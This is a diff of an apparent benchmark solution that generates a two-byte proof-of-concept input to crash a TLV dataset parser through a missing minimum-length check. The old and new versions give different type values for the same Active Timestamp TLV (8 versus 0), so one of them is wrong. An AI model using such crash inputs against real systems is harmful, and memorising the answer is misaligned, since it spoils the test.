@@ -1,30 +1,28 @@
-import os
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
 
-        The vulnerability exists in `Dataset::IsTlvValid()` where the minimum length
-        of certain TLVs (Type-Length-Value) is not checked. Specifically, the
-        Active Timestamp TLV (type 8) is expected to have a value of at least 8 bytes.
+        Args:
+            src_path: Path to the vulnerable source code tarball
 
-        By crafting a TLV with type 8 and a length of 0, we can bypass validation
-        in the vulnerable version. When a subsequent function attempts to read
-        the 8-byte timestamp from this TLV, it results in an out-of-bounds read,
-        causing a crash.
-
-        The PoC is a 2-byte TLV:
-        - Type: 0x08 (Active Timestamp)
-        - Length: 0x00
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
-        
-        # TLV Type for Active Timestamp is 8.
-        tlv_type = 0x08
-        
-        # A length of 0 is provided, which is less than the expected minimum of 8.
-        tlv_length = 0x00
-        
-        poc = bytes([tlv_type, tlv_length])
-        
-        return poc
+        # The vulnerability is a failure to validate the minimum required length for
+        # specific TLV (Type-Length-Value) structures in a dataset. The
+        # Active Timestamp TLV (type 0) is expected to have a value length of 8 bytes.
+        #
+        # In the vulnerable code, the `IsTlvValid()` method does not check if the
+        # length of an Active Timestamp TLV is at least 8. This allows a TLV with
+        # a smaller length to be considered valid. Subsequent code attempting to
+        # read the full 8-byte timestamp from this malformed TLV will read past the
+        # end of the provided buffer, causing a crash (buffer over-read).
+        #
+        # This PoC consists of the most minimal malformed Active Timestamp TLV possible:
+        # - Type (1 byte): 0x00 (kActiveTimestamp)
+        # - Length (1 byte): 0x00 (specifies an empty value field, should be 8)
+        # The total PoC is 2 bytes. When the parser encounters this, it will
+        # attempt to read 8 bytes for the timestamp value from an empty field,
+        # resulting in an immediate out-of-bounds read.
+        return b'\x00\x00'
